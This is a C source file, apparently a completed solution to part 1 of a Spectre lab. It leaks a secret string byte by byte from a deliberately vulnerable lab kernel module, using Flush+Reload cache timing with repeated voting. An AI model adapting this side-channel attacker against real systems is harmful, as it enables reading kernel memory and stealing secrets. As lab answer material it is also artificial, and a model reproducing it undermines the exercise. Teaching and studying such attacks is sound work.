/*
 * Exploiting Speculative Execution
 *
 * Part 1
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include "labspectre.h"
#include "labspectreipc.h"

#define THRESHOLD 180
#define ATTEMPTS 100

/*
 * call_kernel_part1
 * Performs the COMMAND_PART1 call in the kernel
 *
 * Arguments:
 *  - kernel_fd: A file descriptor to the kernel module
 *  - shared_memory: Memory region to share with the kernel
 *  - offset: The offset into the secret to try and read
 */
static inline void call_kernel_part1(int kernel_fd, char *shared_memory, size_t offset) {
    spectre_lab_command local_cmd;
    local_cmd.kind = COMMAND_PART1;
    local_cmd.arg1 = (uint64_t)shared_memory;
    local_cmd.arg2 = offset;

    write(kernel_fd, (void *)&local_cmd, sizeof(local_cmd));
}

/*
 * run_attacker
 *
 * Arguments:
 *  - kernel_fd: A file descriptor referring to the lab vulnerable kernel module
 *  - shared_memory: A pointer to a region of memory shared with the kernel
 */
int run_attacker(int kernel_fd, char *shared_memory) {
    char leaked_str[SHD_SPECTRE_LAB_SECRET_MAX_LEN];
    size_t current_offset = 0;

    printf("Launching attacker\n");

    for (current_offset = 0; current_offset < SHD_SPECTRE_LAB_SECRET_MAX_LEN; current_offset++) {
        char leaked_byte;

        int candidates[256] = {0};

        for (int attempt = 0; attempt < ATTEMPTS; attempt++) {

            for (int i = 0; i < 256; i++) {
                clflush(&shared_memory[i * SHD_SPECTRE_LAB_PAGE_SIZE]);
            }

            call_kernel_part1(kernel_fd, shared_memory, current_offset);

            for (int i = 0; i < 256; i++) {
                int mix_i = ((i * 167) + 13) & 255;
                char *addr = &shared_memory[mix_i * SHD_SPECTRE_LAB_PAGE_SIZE];
                uint64_t dt = time_access(addr);

                if (dt < THRESHOLD) {
                    candidates[mix_i]++;
                }
            }
        }

        int best = 0;
        for (int i = 1; i < 256; i++) {
            if (candidates[i] > candidates[best]) best = i;
        }

        leaked_byte = (char)best;

        leaked_str[current_offset] = leaked_byte;
        if (leaked_byte == '\x00') {
            break;
        }
    }

    printf("\n\n[Part 1] We leaked:\n%s\n", leaked_str);

    close(kernel_fd);
    return EXIT_SUCCESS;
}